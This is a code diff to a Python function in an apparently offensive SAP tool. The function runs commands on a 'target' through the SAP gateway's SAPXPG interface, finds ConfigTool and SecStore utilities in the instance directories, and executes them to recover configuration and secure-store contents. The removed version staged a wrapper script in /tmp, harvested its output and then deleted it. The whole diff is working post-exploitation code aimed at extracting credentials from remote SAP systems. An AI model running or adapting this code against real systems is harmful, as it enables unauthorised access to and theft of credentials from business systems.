@@ -243,12 +243,14 @@ def dump_configtool(sid: str,
 
     result["instances_tried"] = inst_dirs
 
-    # 2. Build one self-contained wrapper script that sources the SAP
-    # env and iterates every candidate directory + tool + arg combo.
-    # This sidesteps the SAPXPG `bash -lc` whitespace-split problem
-    # completely: we only need to launch the wrapper once, with no
-    # quoted args.  Output is bounded with `head -500` per tool so
-    # hitting an accidentally-recursive dumper doesn't OOM us.
+    # 2. Build the full list of candidate absolute paths — each tool x
+    #    each instance directory.  We used to wrap these in a single
+    #    bash script and cat its output back, but that path is brittle:
+    #    SAPXPG's P4 output capture drops stdout from the wrapper even
+    #    when the file it redirected to contains real data, and the
+    #    follow-up `cat` sometimes also returns empty even on known-
+    #    good files.  So we invoke each tool as its own SAPXPG round-
+    #    trip — short-lived commands whose P4 capture reliably works.
     def _expand(tmpl, d):
         return tmpl.format(sid=sid, inst_dir=d)
 
@@ -257,140 +259,84 @@ def dump_configtool(sid: str,
         cfg_dirs.append(_CONFIGTOOL_DIR_TMPL.format(sid=sid, inst_dir=d))
         for tmpl in _AUX_TOOL_DIRS:
             cfg_dirs.append(_expand(tmpl, d))
-    cfg_dirs_sh = " ".join(f'"{d}"' for d in cfg_dirs)
 
-    # Wrapper writes its entire aggregated output to OUT_FILE instead of
-    # stdout.  SAPXPG's P4 output capture is unreliable for scripts that
-    # run more than a second or two (buffering / short capture window),
-    # so we decouple: execution produces a file, a follow-up `cat`
-    # harvests the file.  Each invoke block records to the file and is
-    # delimited by === markers the Python parser splits on.
-    out_file = "/tmp/sapmap_ct.out"
-    wrapper = f"""#!/bin/bash
-# SAPMAP ConfigTool wrapper.  Sources SAP env, iterates candidate
-# directories x tools x args, writes results to {out_file}.  stdin is
-# redirected from /dev/null so interactive tools (secstore.sh password
-# prompt) can't hang waiting on a tty.
-exec </dev/null
-OUT={out_file}
-: > "$OUT"
-echo "=== SAPMAP_CT_START pid=$$ uid=$(id -u) whoami=$(whoami) ===" >> "$OUT"
-for f in /home/*/.sapenv_*.sh /home/*/.sapenv.sh \\
-         /usr/sap/*/home/.sapenv_*.sh; do
-  [ -f "$f" ] && . "$f" 2>/dev/null
-done
-[ -d /usr/sap/{sid}/SYS/exe/run ] && \\
-  export PATH=/usr/sap/{sid}/SYS/exe/run:$PATH
-echo "=== env JAVA_HOME=$JAVA_HOME PATH=$PATH ===" >> "$OUT"
-invoke() {{
-  local script=$1 ; shift
-  local args=$@
-  for d in {cfg_dirs_sh}; do
-    local p="$d/$script"
-    if [ -x "$p" ]; then
-      {{
-        echo "=== $p $args ==="
-        timeout 20 "$p" $args 2>&1 < /dev/null | head -500
-        echo
-      }} >> "$OUT"
-    fi
-  done
-}}
-"""
-    for script, args, _ in attempts:
-        wrapper += f'invoke "{script}" {args}\n'
-    wrapper += 'echo "=== SAPMAP_CT_END ===" >> "$OUT"\n'
-
-    log(f"[*] configtool: writing /tmp/sapmap_ct.sh ({len(wrapper)} B) "
-        f"to target via chunked python3 …")
-    if not _write_remote_file(run_cmd, "/tmp/sapmap_ct.sh",
-                                wrapper, log=log):
-        result["error"] = ("could not write wrapper script to /tmp "
-                           "— python3 unreachable or /tmp not writable")
+    # Step 3.  Discover which tools exist on disk before invoking.
+    # `/usr/bin/test -x <path>` returns exit 0 with no output for
+    # executables — but SAPXPG's P4 doesn't surface exit codes
+    # reliably.  Use `/bin/ls -la <path>` instead: if the path exists
+    # we get a line back, if not we get "No such file or directory".
+    log(f"[*] configtool: probing {len(cfg_dirs)} candidate directories "
+        f"for {len(attempts)} tool(s) each …")
+    present = []   # list of (full_path, args, name)
+    for d in cfg_dirs:
+        for (tool, args, _needs_env) in attempts:
+            full = f"{d}/{tool}"
+            r = run_cmd("/bin/ls", full)
+            lines = r.get("output") or []
+            joined = " ".join(str(x) for x in lines).lower()
+            if not joined:
+                continue
+            if ("no such file" in joined or
+                "cannot access" in joined or
+                "does not exist" in joined):
+                continue
+            present.append((full, args, tool))
+    if not present:
+        result["error"] = (
+            "none of the candidate ConfigTool / SecStoreFS scripts / "
+            "binaries are present on target — searched "
+            f"{len(cfg_dirs)} directories for "
+            f"{len(set(t for t,_,_ in attempts))} tools.  The Java "
+            "install may use a non-standard layout; run `find "
+            f"/usr/sap/{sid} -name 'rsecssfx' -o -name 'configtool.sh' "
+            "-o -name 'secstore*.sh' 2>/dev/null` via the GW terminal "
+            "to locate them, then pass inst_dir / tool paths directly.")
         log(f"[-] configtool: {result['error']}")
         return result
+    log(f"[+] configtool: found {len(present)} tool(s) on target: "
+        f"{', '.join(sorted(set(p[2] for p in present)))}")
 
-    # chmod +x, remove any stale output file from a prior run
-    run_cmd("python3", "-c __import__('os').chmod('/tmp/sapmap_ct.sh',0o755)")
-    run_cmd("/bin/rm", f"-f {out_file}")
-
-    # Execute the wrapper.  Output lands in out_file; P4 stdout capture
-    # here is usually empty and we don't care — the next call is what
-    # returns the real data.
-    log(f"[*] configtool: running /tmp/sapmap_ct.sh (output → {out_file}) …")
-    run_cmd("/tmp/sapmap_ct.sh", "")
-    # Pause for slow/hanging tools: wrapper has `timeout 20` per invocation.
-    # Give it a beat, then harvest.
-    log(f"[*] configtool: harvesting {out_file} …")
-    cat_r = run_cmd("/bin/cat", out_file)
-    out_lines = cat_r.get("output") or []
-    dump = "\n".join(str(l) for l in out_lines)
-    log(f"[+] configtool: harvested {len(dump)} bytes in "
-        f"{len(out_lines)} lines from {out_file}")
-    if not out_lines:
-        # Last-ditch: maybe wrapper never ran.  Try invoking via explicit
-        # /bin/bash in case SAPXPG refused to honor the shebang.
-        log(f"[!] configtool: {out_file} empty — retrying via /bin/bash …")
-        run_cmd("/bin/bash", "/tmp/sapmap_ct.sh")
-        cat_r = run_cmd("/bin/cat", out_file)
-        out_lines = cat_r.get("output") or []
-        dump = "\n".join(str(l) for l in out_lines)
-        log(f"[+] configtool: retry harvested {len(dump)} bytes in "
-            f"{len(out_lines)} lines")
-
-    # Cleanup
-    run_cmd("/bin/rm", f"-f /tmp/sapmap_ct.sh {out_file}")
-
-    # Parse the dump into per-tool blocks for the results structure
+    # Step 4.  Invoke each tool directly via SAPXPG.  Aggregate output.
     all_output = []
-    cur_cmd = None
-    buf = []
-    for line in out_lines:
-        s = str(line)
-        if s.startswith("=== ") and s.endswith(" ==="):
-            if cur_cmd and buf:
-                snippet = "\n".join(buf).strip()
-                if snippet:
-                    all_output.append(f"=== {cur_cmd} ===\n{snippet}\n")
-                    result["successful_commands"].append({
-                        "dir": cur_cmd.rsplit("/", 1)[0] if "/" in cur_cmd
-                                else "",
-                        "script": cur_cmd.split()[0].rsplit("/", 1)[-1]
-                                    if cur_cmd else "",
-                        "args": " ".join(cur_cmd.split()[1:])
-                                    if cur_cmd else "",
-                        "bytes": len(snippet),
-                        "snippet": snippet[:500],
-                    })
-            cur_cmd = s[4:-4].strip()
-            buf = []
-        else:
-            buf.append(s)
-    if cur_cmd and buf:
-        snippet = "\n".join(buf).strip()
-        if snippet:
-            all_output.append(f"=== {cur_cmd} ===\n{snippet}\n")
-            result["successful_commands"].append({
-                "dir": cur_cmd.rsplit("/", 1)[0] if "/" in cur_cmd else "",
-                "script": cur_cmd.split()[0].rsplit("/", 1)[-1]
-                            if cur_cmd else "",
-                "args": " ".join(cur_cmd.split()[1:]) if cur_cmd else "",
-                "bytes": len(snippet),
-                "snippet": snippet[:500],
-            })
+    for full_path, args, tool_name in present:
+        log(f"[*] configtool: running {full_path} {args} …")
+        r = run_cmd(full_path, args)
+        lines = r.get("output") or []
+        snippet = "\n".join(str(l) for l in lines).strip()
+        err = (r.get("error") or "").strip()
+        if not snippet and err:
+            log(f"[!] configtool:   error: {err[:200]}")
+            continue
+        if not snippet:
+            # Some tools write only to stderr on success (help text) —
+            # a short "no output" line keeps the aggregate readable.
+            log(f"[*] configtool:   (no output)")
+            continue
+        log(f"[+] configtool:   {len(snippet)} B back "
+            f"({len(lines)} lines)")
+        header = f"=== {full_path} {args} ==="
+        all_output.append(f"{header}\n{snippet}\n")
+        result["successful_commands"].append({
+            "dir": full_path.rsplit("/", 1)[0],
+            "script": tool_name,
+            "args": args,
+            "bytes": len(snippet),
+            "snippet": snippet[:500],
+        })
 
     result["dump_text"] = "\n".join(all_output)
     if all_output:
         result["success"] = True
         log(f"[+] configtool: total recovered output = "
             f"{len(result['dump_text'])} bytes across "
-            f"{len(result['successful_commands'])} script invocations")
+            f"{len(result['successful_commands'])} tool invocations")
     else:
         result["error"] = (
-            "no configtool script produced usable output on any "
-            "instance directory — try passing a ConfigTool master "
-            "password via the 'password' arg, or run the commands "
-            "manually via the GW terminal")
+            f"{len(present)} tool(s) found on target but none produced "
+            "usable output — likely they require SAP env vars "
+            "(JAVA_HOME, LD_LIBRARY_PATH) or a master password.  Run "
+            "one of them via the GW terminal (Data Extraction → OS "
+            "Terminal) with `bash -lc` to source the sapenv first.")
         log(f"[-] configtool: {result['error']}")
 
     return result
